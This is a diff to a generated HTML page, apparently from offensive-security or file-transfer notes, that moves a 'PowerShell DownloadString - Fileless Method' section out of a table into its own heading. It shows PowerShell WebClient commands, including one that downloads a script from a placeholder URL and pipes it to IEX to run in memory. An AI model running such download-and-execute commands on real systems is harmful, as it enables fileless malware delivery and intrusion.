@@ -973,6 +973,17 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#powershell-downloadstring-fileless-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerShell DownloadString - Fileless Method
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#powershell-invoke-webrequest" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1119,6 +1130,17 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
+  <a href="#powershell-downloadstring-fileless-method" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PowerShell DownloadString - Fileless Method
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#powershell-invoke-webrequest" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1249,18 +1271,12 @@
 <td>DownloadStringAsync</td>
 <td>Downloads a String from a resource without blocking the calling thread.</td>
 </tr>
-<tr>
-<td>### PowerShell DownloadString - Fileless Method</td>
-<td></td>
-</tr>
-<tr>
-<td><div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># Windows (Fileless Method)</span>
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">'&lt;Target_File_URL&gt;'</span><span class="p">,</span><span class="s1">'&lt;Output_File_Name&gt;'</span><span class="p">)</span>
-</code></pre></div></td>
-<td></td>
-</tr>
 </tbody>
 </table>
+<h3 id="powershell-downloadstring-fileless-method">PowerShell DownloadString - Fileless Method</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c"># Windows (Fileless Method)</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadFile</span><span class="p">(</span><span class="s1">'&lt;Target_File_URL&gt;'</span><span class="p">,</span><span class="s1">'&lt;Output_File_Name&gt;'</span><span class="p">)</span>
+</code></pre></div>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c"># Windows (Piped Fileless Method)</span>
 <a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">'https://&lt;File&gt;'</span><span class="p">)</span> <span class="p">|</span> <span class="nb">IEX</span>
 </code></pre></div>
